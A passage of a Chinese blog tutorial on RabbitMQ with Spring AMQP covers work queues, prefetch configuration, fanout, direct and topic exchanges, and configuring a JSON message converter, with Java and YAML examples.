LocalTime.now());</span><br><span class="line">    Thread.sleep(<span class="number">200</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这个消费者sleep了1000秒，模拟任务耗时。<br><a name="S3N47"></a></p><h3 id="3-2-3-测试"><a href="#3-2-3-测试" class="headerlink" title="3.2.3.测试"></a>3.2.3.测试</h3><p>启动ConsumerApplication后，在执行publisher服务中刚刚编写的发送测试方法testWorkQueue。<br />可以看到消费者1很快完成了自己的25条消息。消费者2却在缓慢的处理自己的25条消息。<br />也就是说消息是平均分配给每个消费者，并没有考虑到消费者的处理能力。这样显然是有问题的。<br><a name="Rqsrd"></a></p><h3 id="3-2-4-能者多劳"><a href="#3-2-4-能者多劳" class="headerlink" title="3.2.4.能者多劳"></a>3.2.4.能者多劳</h3><p>在spring中有一个简单的配置，可以解决这个问题。我们修改consumer服务的application.yml文件，添加配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">rabbitmq:</span></span><br><span class="line">    <span class="attr">listener:</span></span><br><span class="line">      <span class="attr">simple:</span></span><br><span class="line">        <span class="attr">prefetch:</span> <span class="number">1</span> <span class="comment"># 每次只能获取一条消息，处理完成才能获取下一个消息</span></span><br></pre></td></tr></table></figure><p><a name="CMhwi"></a></p><h3 id="3-2-5-总结"><a href="#3-2-5-总结" class="headerlink" title="3.2.5.总结"></a>3.2.5.总结</h3><p>Work模型的使用：</p></li><li><p>多个消费者绑定到一个队列，同一条消息只会被一个消费者处理</p></li><li><p>通过设置prefetch来控制消费者预取的消息数量<br><a name="Vjep9"></a></p><h2 id="3-3-发布-订阅"><a href="#3-3-发布-订阅" class="headerlink" title="3.3.发布/订阅"></a>3.3.发布/订阅</h2><p>发布订阅的模型如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787681-4aeb1677-7204-4ad4-8527-0df956d43573.png#averageHue=%23fcf7f7&crop=0&crop=0&crop=1&crop=1&id=e81wW&originHeight=462&originWidth=1431&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，在订阅模型中，多了一个exchange角色，而且过程略有变化：</p></li><li><p>Publisher：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给X（交换机）</p></li><li><p>Exchange：交换机，图中的X。一方面，接收生产者发送的消息。另一方面，知道如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。到底如何操作，取决于Exchange的类型。Exchange有以下3种类型：</p><ul><li>Fanout：广播，将消息交给所有绑定到交换机的队列</li><li>Direct：定向，把消息交给符合指定routing key 的队列</li><li>Topic：通配符，把消息交给符合routing pattern（路由模式） 的队列</li></ul></li><li><p>Consumer：消费者，与以前一样，订阅队列，没有变化</p></li><li><p>Queue：消息队列也与以前一样，接收消息、缓存消息。</p></li></ul><p><strong>Exchange（交换机）只负责转发消息，不具备存储消息的能力</strong>，因此如果没有任何队列与Exchange绑定，或者没有符合路由规则的队列，那么消息会丢失！<br><a name="yGXsj"></a></p><h2 id="3-4-Fanout"><a href="#3-4-Fanout" class="headerlink" title="3.4.Fanout"></a>3.4.Fanout</h2><p>Fanout，英文翻译是扇出，我觉得在MQ中叫广播更合适。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787762-a73eeff1-b2d6-4549-9fb2-5406a6c2eee3.png#averageHue=%23fcf6f6&crop=0&crop=0&crop=1&crop=1&id=uR1Vd&originHeight=431&originWidth=1416&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在广播模式下，消息发送流程是这样的：</p><ul><li>1）  可以有多个队列</li><li>2）  每个队列都要绑定到Exchange（交换机）</li><li>3）  生产者发送的消息，只能发送到交换机，交换机来决定要发给哪个队列，生产者无法决定</li><li>4）  交换机把消息发送给绑定过的所有队列</li><li>5）  订阅队列的消费者都能拿到消息</li></ul><p>我们的计划是这样的：</p><ul><li>创建一个交换机 itcast.fanout，类型是Fanout</li><li>创建两个队列fanout.queue1和fanout.queue2，绑定到交换机itcast.fanout</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787843-757ef8b9-af77-4a7b-9279-be6dd1ba6dc3.png#averageHue=%23faf4f4&crop=0&crop=0&crop=1&crop=1&id=crdxG&originHeight=265&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="F3BJ3"></a></p><h3 id="3-4-1-声明队列和交换机"><a href="#3-4-1-声明队列和交换机" class="headerlink" title="3.4.1.声明队列和交换机"></a>3.4.1.声明队列和交换机</h3><p>Spring提供了一个接口Exchange，来表示所有不同类型的交换机：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147787931-230738f8-6723-4ae1-9111-64e027bca438.png#averageHue=%23ecf3e4&crop=0&crop=0&crop=1&crop=1&id=rQnLa&originHeight=332&originWidth=980&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在consumer中创建一个类，声明队列和交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.mq.config;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.Binding;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.BindingBuilder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.FanoutExchange;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.Queue;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FanoutConfig</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 声明交换机</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Fanout类型交换机</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> FanoutExchange <span class="title">fanoutExchange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> FanoutExchange(<span class="string">&quot;itcast.fanout&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 第1个队列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Queue <span class="title">fanoutQueue1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Queue(<span class="string">&quot;fanout.queue1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 绑定队列和交换机</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Binding <span class="title">bindingQueue1</span><span class="params">(Queue fanoutQueue1, FanoutExchange fanoutExchange)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fanoutQueue1).to(fanoutExchange);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 第2个队列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Queue <span class="title">fanoutQueue2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Queue(<span class="string">&quot;fanout.queue2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 绑定队列和交换机</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Binding <span class="title">bindingQueue2</span><span class="params">(Queue fanoutQueue2, FanoutExchange fanoutExchange)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BindingBuilder.bind(fanoutQueue2).to(fanoutExchange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="y22gD"></a></p><h3 id="3-4-2-消息发送"><a href="#3-4-2-消息发送" class="headerlink" title="3.4.2.消息发送"></a>3.4.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFanoutExchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 队列名称</span></span><br><span class="line">    String exchangeName = <span class="string">&quot;itcast.fanout&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;hello, everyone!&quot;</span>;</span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;&quot;</span>, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="KP2F9"></a></p><h3 id="3-4-3-消息接收"><a href="#3-4-3-消息接收" class="headerlink" title="3.4.3.消息接收"></a>3.4.3.消息接收</h3><p>在consumer服务的SpringRabbitListener中添加两个方法，作为消费者：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(queues = &quot;fanout.queue1&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenFanoutQueue1</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者1接收到Fanout消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(queues = &quot;fanout.queue2&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenFanoutQueue2</span><span class="params">(String msg)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者2接收到Fanout消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="InRp8"></a></p><h3 id="3-4-4-总结"><a href="#3-4-4-总结" class="headerlink" title="3.4.4.总结"></a>3.4.4.总结</h3><p>交换机的作用是什么？</p><ul><li>接收publisher发送的消息</li><li>将消息按照规则路由到与之绑定的队列</li><li>不能缓存消息，路由失败，消息丢失</li><li>FanoutExchange的会将消息路由到每个绑定的队列</li></ul><p>声明队列、交换机、绑定关系的Bean是什么？</p><ul><li><p>Queue</p></li><li><p>FanoutExchange</p></li><li><p>Binding<br><a name="XbUES"></a></p><h2 id="3-5-Direct"><a href="#3-5-Direct" class="headerlink" title="3.5.Direct"></a>3.5.Direct</h2><p>在Fanout模式中，一条消息，会被所有订阅的队列都消费。但是，在某些场景下，我们希望不同的消息被不同的队列消费。这时就要用到Direct类型的Exchange。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788019-955e2d17-01d7-45b3-8d6f-62a8313177a4.png#averageHue=%23fcf5f5&crop=0&crop=0&crop=1&crop=1&id=yOiFA&originHeight=494&originWidth=1611&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在Direct模型下：</p></li><li><p>队列与交换机的绑定，不能是任意绑定了，而是要指定一个<code>RoutingKey</code>（路由key）</p></li><li><p>消息的发送方在 向 Exchange发送消息时，也必须指定消息的 <code>RoutingKey</code>。</p></li><li><p>Exchange不再把消息交给每一个绑定的队列，而是根据消息的<code>Routing Key</code>进行判断，只有队列的<code>Routingkey</code>与消息的 <code>Routing key</code>完全一致，才会接收到消息</p></li></ul><p><strong>案例需求如下</strong>：</p><ol><li>利用@RabbitListener声明Exchange、Queue、RoutingKey</li><li>在consumer服务中，编写两个消费者方法，分别监听direct.queue1和direct.queue2</li><li>在publisher中编写测试方法，向itcast. direct发送消息</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788106-e7b49dcc-e945-401c-a98d-7481e0a711c1.png#averageHue=%23fbf5f5&crop=0&crop=0&crop=1&crop=1&id=Aj1Pf&originHeight=444&originWidth=1201&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="nE7lQ"></a></p><h3 id="3-5-1-基于注解声明队列和交换机"><a href="#3-5-1-基于注解声明队列和交换机" class="headerlink" title="3.5.1.基于注解声明队列和交换机"></a>3.5.1.基于注解声明队列和交换机</h3><p>基于@Bean的方式声明队列和交换机比较麻烦，Spring还提供了基于注解方式来声明。<br />在consumer的SpringRabbitListener中添加两个消费者，同时基于注解来声明队列和交换机：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;direct.queue1&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;red&quot;, &quot;blue&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenDirectQueue1</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到direct.queue1的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;direct.queue2&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.direct&quot;, type = ExchangeTypes.DIRECT),</span></span><br><span class="line"><span class="meta">    key = &#123;&quot;red&quot;, &quot;yellow&quot;&#125;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenDirectQueue2</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到direct.queue2的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="oy60j"></a></p><h3 id="3-5-2-消息发送"><a href="#3-5-2-消息发送" class="headerlink" title="3.5.2.消息发送"></a>3.5.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendDirectExchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 交换机名称</span></span><br><span class="line">    String exchangeName = <span class="string">&quot;itcast.direct&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;红色警报！日本乱排核废水，导致海洋生物变异，惊现哥斯拉！&quot;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;red&quot;</span>, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="Zua1L"></a></p><h3 id="3-5-3-总结"><a href="#3-5-3-总结" class="headerlink" title="3.5.3.总结"></a>3.5.3.总结</h3><p>描述下Direct交换机与Fanout交换机的差异？</p><ul><li>Fanout交换机将消息路由给每一个与之绑定的队列</li><li>Direct交换机根据RoutingKey判断路由给哪个队列</li><li>如果多个队列具有相同的RoutingKey，则与Fanout功能类似</li></ul><p>基于@RabbitListener注解声明队列和交换机有哪些常见注解？</p><ul><li><p><a href="/Queue">_@_Queue </a></p></li><li><p><a href="/Exchange">_@_Exchange </a><br><a name="sZ0IL"></a></p><h2 id="3-6-Topic"><a href="#3-6-Topic" class="headerlink" title="3.6.Topic"></a>3.6.Topic</h2><p><a name="iWcOC"></a></p><h3 id="3-6-1-说明"><a href="#3-6-1-说明" class="headerlink" title="3.6.1.说明"></a>3.6.1.说明</h3><p><code>Topic</code>类型的<code>Exchange</code>与<code>Direct</code>相比，都是可以根据<code>RoutingKey</code>把消息路由到不同的队列。只不过<code>Topic</code>类型<code>Exchange</code>可以让队列在绑定<code>Routing key</code> 的时候使用通配符！<br /><code>Routingkey</code> 一般都是有一个或多个单词组成，多个单词之间以”.”分割，例如： <code>item.insert</code><br />通配符规则：<br /><code>#</code>：匹配一个或多个词<br /><code>*</code>：匹配不多不少恰好1个词<br />举例：<br /><code>item.#</code>：能够匹配<code>item.spu.insert</code> 或者 <code>item.spu</code><br /><code>item.*</code>：只能匹配<code>item.spu</code><br />图示：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788193-3b31831c-3646-424d-818e-4a8c9ff69f27.png#averageHue=%23f8f0ef&crop=0&crop=0&crop=1&crop=1&id=r1SbP&originHeight=557&originWidth=1678&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />解释：</p></li><li><p>Queue1：绑定的是<code>china.#</code> ，因此凡是以 <code>china.</code>开头的<code>routing key</code> 都会被匹配到。包括china.news和china.weather</p></li><li><p>Queue2：绑定的是<code>#.news</code> ，因此凡是以 <code>.news</code>结尾的 <code>routing key</code> 都会被匹配。包括china.news和japan.news</p></li></ul><p>案例需求：<br />实现思路如下：</p><ol><li>并利用@RabbitListener声明Exchange、Queue、RoutingKey</li><li>在consumer服务中，编写两个消费者方法，分别监听topic.queue1和topic.queue2</li><li>在publisher中编写测试方法，向itcast. topic发送消息</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788285-52c1019e-b1a5-4f71-bf8f-e2d570632ca1.png#averageHue=%23fbf4f4&crop=0&crop=0&crop=1&crop=1&id=tcuAJ&originHeight=349&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="JqciL"></a></p><h3 id="3-6-2-消息发送"><a href="#3-6-2-消息发送" class="headerlink" title="3.6.2.消息发送"></a>3.6.2.消息发送</h3><p>在publisher服务的SpringAmqpTest类中添加测试方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * topicExchange</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendTopicExchange</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 交换机名称</span></span><br><span class="line">    String exchangeName = <span class="string">&quot;itcast.topic&quot;</span>;</span><br><span class="line">    <span class="comment">// 消息</span></span><br><span class="line">    String message = <span class="string">&quot;123123&quot;</span>;</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(exchangeName, <span class="string">&quot;china.news&quot;</span>, message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="JDboz"></a></p><h3 id="3-6-3-消息接收"><a href="#3-6-3-消息接收" class="headerlink" title="3.6.3.消息接收"></a>3.6.3.消息接收</h3><p>在consumer服务的SpringRabbitListener中添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;topic.queue1&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">    key = &quot;china.#&quot;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenTopicQueue1</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到topic.queue1的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@RabbitListener(bindings = @QueueBinding(</span></span><br><span class="line"><span class="meta">    value = @Queue(name = &quot;topic.queue2&quot;),</span></span><br><span class="line"><span class="meta">    exchange = @Exchange(name = &quot;itcast.topic&quot;, type = ExchangeTypes.TOPIC),</span></span><br><span class="line"><span class="meta">    key = &quot;#.news&quot;</span></span><br><span class="line"><span class="meta">))</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">listenTopicQueue2</span><span class="params">(String msg)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;消费者接收到topic.queue2的消息：【&quot;</span> + msg + <span class="string">&quot;】&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="PARTg"></a></p><h3 id="3-6-4-总结"><a href="#3-6-4-总结" class="headerlink" title="3.6.4.总结"></a>3.6.4.总结</h3><p>描述下Direct交换机与Topic交换机的差异？</p><ul><li><p>Topic交换机接收的消息RoutingKey必须是多个单词，以 <code>**.**</code> 分割</p></li><li><p>Topic交换机与队列绑定时的bindingKey可以指定通配符</p></li><li><p><code>#</code>：代表0个或多个词</p></li><li><p><code>*</code>：代表1个词<br><a name="nEmH2"></a></p><h2 id="3-7-消息转换器"><a href="#3-7-消息转换器" class="headerlink" title="3.7.消息转换器"></a>3.7.消息转换器</h2><p>之前说过，Spring会把你发送的消息序列化为字节发送给MQ，接收消息的时候，还会把字节反序列化为Java对象。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788362-85cd58d8-6ff7-4b5d-9f87-dfd2505c40e2.png#averageHue=%23d7e8ca&crop=0&crop=0&crop=1&crop=1&id=RW0nO&originHeight=294&originWidth=1167&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />只不过，默认情况下Spring采用的序列化方式是JDK序列化。众所周知，JDK序列化存在下列问题：</p></li><li><p>数据体积过大</p></li><li><p>有安全漏洞</p></li><li><p>可读性差</p></li></ul><p>我们来测试一下。<br><a name="thtY7"></a></p><h3 id="3-7-1-测试默认转换器"><a href="#3-7-1-测试默认转换器" class="headerlink" title="3.7.1.测试默认转换器"></a>3.7.1.测试默认转换器</h3><p>我们修改消息发送的代码，发送一个Map对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSendMap</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    <span class="comment">// 准备消息</span></span><br><span class="line">    Map&lt;String,Object&gt; msg = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    msg.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">    msg.put(<span class="string">&quot;age&quot;</span>, <span class="number">21</span>);</span><br><span class="line">    <span class="comment">// 发送消息</span></span><br><span class="line">    rabbitTemplate.convertAndSend(<span class="string">&quot;simple.queue&quot;</span>,<span class="string">&quot;&quot;</span>, msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>停止consumer服务<br />发送消息后查看控制台：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670147788452-169f9ba6-21ff-4c85-b9e9-c3f7c91c3653.png#averageHue=%23f9f8f7&crop=0&crop=0&crop=1&crop=1&id=ObbD9&originHeight=388&originWidth=1385&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="Aijdb"></a></p><h3 id="3-7-2-配置JSON转换器"><a href="#3-7-2-配置JSON转换器" class="headerlink" title="3.7.2.配置JSON转换器"></a>3.7.2.配置JSON转换器</h3><p>显然，JDK序列化方式并不合适。我们希望消息体的体积更小、可读性更高，因此可以使用JSON方式来做序列化和反序列化。<br />在publisher和consumer两个服务中都引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.dataformat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-dataformat-xml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置消息转换器。<br />在启动类中添加一个Bean即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> MessageConverter <span class="title">jsonMessageConverter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Jackson2JsonMessageConverter();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 生活杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式事务</title>
      <link href="/bufferfly/blog/3452718768.html"/>
      <url>/bufferfly/blog/3452718768.html</url>
      
